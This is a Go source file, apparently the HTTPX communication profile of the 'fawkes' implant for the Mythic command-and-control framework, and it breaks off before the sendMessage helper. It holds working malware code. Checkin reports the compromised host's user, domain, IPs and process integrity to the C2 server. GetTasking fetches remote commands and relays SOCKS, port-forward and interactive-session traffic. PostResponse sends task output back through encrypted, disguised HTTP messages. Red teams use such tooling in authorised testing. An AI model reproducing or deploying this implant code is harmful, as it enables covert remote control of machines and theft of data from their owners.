package httpx

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net/http"

	"fawkes/pkg/structs"
)

// Checkin performs the initial agent registration with Mythic via httpx.
func (h *HTTPXProfile) Checkin(agent *structs.Agent) error {
	cfg := h.getConfig()
	if cfg == nil {
		return fmt.Errorf("failed to decrypt C2 configuration")
	}

	checkinMsg := structs.CheckinMessage{
		Action:       "checkin",
		PayloadUUID:  agent.PayloadUUID,
		User:         agent.User,
		Host:         agent.Host,
		PID:          agent.PID,
		OS:           agent.OS,
		Architecture: agent.Architecture,
		Domain:       agent.Domain,
		IPs:          []string{agent.InternalIP},
		ExternalIP:   agent.ExternalIP,
		ProcessName:  agent.ProcessName,
		Integrity:    agent.Integrity,
	}

	body, err := json.Marshal(checkinMsg)
	if err != nil {
		return fmt.Errorf("failed to marshal checkin message: %w", err)
	}

	// Encrypt
	if cfg.EncryptionKey != "" {
		body, err = h.encryptMessage(body, cfg.EncryptionKey)
		if err != nil {
			return fmt.Errorf("encryption failed: %w", err)
		}
	}

	// Mythic format: UUID + encrypted body → base64
	messageData := append([]byte(agent.PayloadUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	// Apply client transforms and send via POST config
	resp, err := h.sendMessage([]byte(encodedData), &cfg.Config.Post, cfg)
	if err != nil {
		return fmt.Errorf("checkin request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("checkin failed with status: %d", resp.StatusCode)
	}

	// Read and reverse server transforms on response
	respBody, err := h.receiveMessage(resp, &cfg.Config.Post)
	if err != nil {
		return fmt.Errorf("failed to read checkin response: %w", err)
	}

	// Decrypt response
	var decryptedResponse []byte
	if cfg.EncryptionKey != "" {
		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
		if err != nil {
			return fmt.Errorf("failed to decode checkin response: %w", err)
		}
		decryptedResponse, err = h.decryptResponse(decodedData, cfg.EncryptionKey)
		if err != nil {
			return fmt.Errorf("failed to decrypt checkin response: %w", err)
		}
	} else {
		decryptedResponse = respBody
	}

	// Parse response to extract callback UUID
	var checkinResponse map[string]interface{}
	if err := json.Unmarshal(decryptedResponse, &checkinResponse); err != nil {
		return fmt.Errorf("failed to parse checkin response: %w", err)
	}

	if callbackID, exists := checkinResponse["id"]; exists {
		if callbackStr, ok := callbackID.(string); ok {
			h.UpdateCallbackUUID(callbackStr)
			log.Printf("session: %s", callbackStr)
		}
	} else if callbackUUID, exists := checkinResponse["uuid"]; exists {
		if callbackStr, ok := callbackUUID.(string); ok {
			h.UpdateCallbackUUID(callbackStr)
			log.Printf("session: %s", callbackStr)
		}
	} else {
		log.Printf("no session id, using default")
		h.UpdateCallbackUUID(agent.PayloadUUID)
	}

	return nil
}

// GetTasking retrieves tasks from Mythic via httpx.
func (h *HTTPXProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
	cfg := h.getConfig()
	if cfg == nil {
		return nil, nil, fmt.Errorf("failed to decrypt C2 configuration")
	}

	taskingMsg := structs.TaskingMessage{
		Action:      "get_tasking",
		TaskingSize: -1,
		Socks:       outboundSocks,
		PayloadUUID: h.getActiveUUID(agent, cfg),
		PayloadType: "fawkes",
		C2Profile:   "httpx",
	}

	// Collect delegate messages
	if h.GetDelegatesOnly != nil {
		if delegates := h.GetDelegatesOnly(); len(delegates) > 0 {
			taskingMsg.Delegates = delegates
		}
	}
	if h.GetRpfwdOutbound != nil {
		if rpfwdMsgs := h.GetRpfwdOutbound(); len(rpfwdMsgs) > 0 {
			taskingMsg.Rpfwd = rpfwdMsgs
		}
	}
	if h.GetInteractiveOutbound != nil {
		if interactiveMsgs := h.GetInteractiveOutbound(); len(interactiveMsgs) > 0 {
			taskingMsg.Interactive = interactiveMsgs
		}
	}

	body, err := json.Marshal(taskingMsg)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to marshal tasking message: %w", err)
	}

	if cfg.EncryptionKey != "" {
		body, err = h.encryptMessage(body, cfg.EncryptionKey)
		if err != nil {
			return nil, nil, fmt.Errorf("encryption failed: %w", err)
		}
	}

	activeUUID := h.getActiveUUID(agent, cfg)
	messageData := append([]byte(activeUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	// Use GET config for get_tasking
	resp, err := h.sendMessage([]byte(encodedData), &cfg.Config.Get, cfg)
	if err != nil {
		return nil, nil, fmt.Errorf("get tasking request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, nil, fmt.Errorf("get tasking failed with status: %d", resp.StatusCode)
	}

	respBody, err := h.receiveMessage(resp, &cfg.Config.Get)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to read response body: %w", err)
	}

	var decryptedData []byte
	if cfg.EncryptionKey != "" {
		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
		if err != nil {
			return nil, nil, fmt.Errorf("failed to decode response: %w", err)
		}
		decryptedData, err = h.decryptResponse(decodedData, cfg.EncryptionKey)
		if err != nil {
			return nil, nil, fmt.Errorf("failed to decrypt response: %w", err)
		}
	} else {
		decryptedData = respBody
	}

	var taskResponse map[string]interface{}
	if err := json.Unmarshal(decryptedData, &taskResponse); err != nil {
		return []structs.Task{}, nil, nil
	}

	// Extract tasks
	var tasks []structs.Task
	if taskList, exists := taskResponse["tasks"]; exists {
		if taskArray, ok := taskList.([]interface{}); ok {
			for _, taskData := range taskArray {
				if taskMap, ok := taskData.(map[string]interface{}); ok {
					task := structs.NewTask(
						getString(taskMap, "id"),
						getString(taskMap, "command"),
						getString(taskMap, "parameters"),
					)
					tasks = append(tasks, task)
				}
			}
		}
	}

	// Extract SOCKS
	var inboundSocks []structs.SocksMsg
	if socksList, exists := taskResponse["socks"]; exists {
		if socksRaw, err := json.Marshal(socksList); err == nil {
			if err := json.Unmarshal(socksRaw, &inboundSocks); err != nil {
				log.Printf("proxy parse error: %v", err)
			}
		}
	}

	// Route rpfwd
	if h.HandleRpfwd != nil {
		if rpfwdList, exists := taskResponse["rpfwd"]; exists {
			if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
				var rpfwdMsgs []structs.SocksMsg
				if err := json.Unmarshal(rpfwdRaw, &rpfwdMsgs); err == nil && len(rpfwdMsgs) > 0 {
					h.HandleRpfwd(rpfwdMsgs)
				}
			}
		}
	}

	// Route interactive
	if h.HandleInteractive != nil {
		if interactiveList, exists := taskResponse["interactive"]; exists {
			if interactiveRaw, err := json.Marshal(interactiveList); err == nil {
				var interactiveMsgs []structs.InteractiveMsg
				if err := json.Unmarshal(interactiveRaw, &interactiveMsgs); err == nil && len(interactiveMsgs) > 0 {
					h.HandleInteractive(interactiveMsgs)
				}
			}
		}
	}

	// Route delegates
	if h.HandleDelegates != nil {
		if delegateList, exists := taskResponse["delegates"]; exists {
			if delegateRaw, err := json.Marshal(delegateList); err == nil {
				var delegateMsgs []structs.DelegateMessage
				if err := json.Unmarshal(delegateRaw, &delegateMsgs); err == nil && len(delegateMsgs) > 0 {
					h.HandleDelegates(delegateMsgs)
				}
			}
		}
	}

	return tasks, inboundSocks, nil
}

// PostResponse sends task output back to Mythic via httpx.
func (h *HTTPXProfile) PostResponse(response structs.Response, agent *structs.Agent, socks []structs.SocksMsg) ([]byte, error) {
	cfg := h.getConfig()
	if cfg == nil {
		return nil, fmt.Errorf("failed to decrypt C2 configuration")
	}

	postMsg := structs.PostResponseMessage{
		Action:    "post_response",
		Responses: []structs.Response{response},
		Socks:     socks,
	}

	// Collect delegates AND edges for PostResponse
	if h.GetDelegatesAndEdges != nil {
		delegates, edges := h.GetDelegatesAndEdges()
		if len(delegates) > 0 {
			postMsg.Delegates = delegates
		}
		if len(edges) > 0 {
			postMsg.Edges = edges
		}
	}
	if h.GetRpfwdOutbound != nil {
		if rpfwdMsgs := h.GetRpfwdOutbound(); len(rpfwdMsgs) > 0 {
			postMsg.Rpfwd = rpfwdMsgs
		}
	}
	if h.GetInteractiveOutbound != nil {
		if interactiveMsgs := h.GetInteractiveOutbound(); len(interactiveMsgs) > 0 {
			postMsg.Interactive = interactiveMsgs
		}
	}

	body, err := json.Marshal(postMsg)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal post response: %w", err)
	}

	if cfg.EncryptionKey != "" {
		body, err = h.encryptMessage(body, cfg.EncryptionKey)
		if err != nil {
			return nil, fmt.Errorf("encryption failed: %w", err)
		}
	}

	activeUUID := h.getActiveUUID(agent, cfg)
	messageData := append([]byte(activeUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	// Use POST config for post_response
	resp, err := h.sendMessage([]byte(encodedData), &cfg.Config.Post, cfg)
	if err != nil {
		return nil, fmt.Errorf("post response request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("post response failed with status: %d", resp.StatusCode)
	}

	respBody, err := h.receiveMessage(resp, &cfg.Config.Post)
	if err != nil {
		return nil, fmt.Errorf("failed to read response: %w", err)
	}

	var decryptedData []byte
	if cfg.EncryptionKey != "" {
		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
		if err != nil {
			return nil, fmt.Errorf("failed to decode response: %w", err)
		}
		decryptedData, err = h.decryptResponse(decodedData, cfg.EncryptionKey)
		if err != nil {
			return nil, fmt.Errorf("failed to decrypt response: %w", err)
		}
	} else {
		decryptedData = respBody
	}

	// Route inbound messages from the post_response response
	var postResponse map[string]interface{}
	if err := json.Unmarshal(decryptedData, &postResponse); err == nil {
		if h.HandleRpfwd != nil {
			if rpfwdList, exists := postResponse["rpfwd"]; exists {
				if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
					var rpfwdMsgs []structs.SocksMsg
					if err := json.Unmarshal(rpfwdRaw, &rpfwdMsgs); err == nil && len(rpfwdMsgs) > 0 {
						h.HandleRpfwd(rpfwdMsgs)
					}
				}
			}
		}
		if h.HandleDelegates != nil {
			if delegateList, exists := postResponse["delegates"]; exists {
				if delegateRaw, err := json.Marshal(delegateList); err == nil {
					var delegateMsgs []structs.DelegateMessage
					if err := json.Unmarshal(delegateRaw, &delegateMsgs); err == nil && len(delegateMsgs) > 0 {
						h.HandleDelegates(delegateMsgs)
					}
				}
			}
		}
		if h.HandleInteractive != nil {
			if interactiveList, exists := postResponse["interactive"]; exists {
				if interactiveRaw, err := json.Marshal(interactiveList); err == nil {
					var interactiveMsgs []structs.InteractiveMsg
					if err := json.Unmarshal(interactiveRaw, &interactiveMsgs); err == nil && len(interactiveMsgs) > 0 {
						h.HandleInteractive(interactiveMsgs)
					}
				}
			}
		}
	}

	return decryptedData, nil
}

// sendMessage applies client transforms, handles message placement, and sends
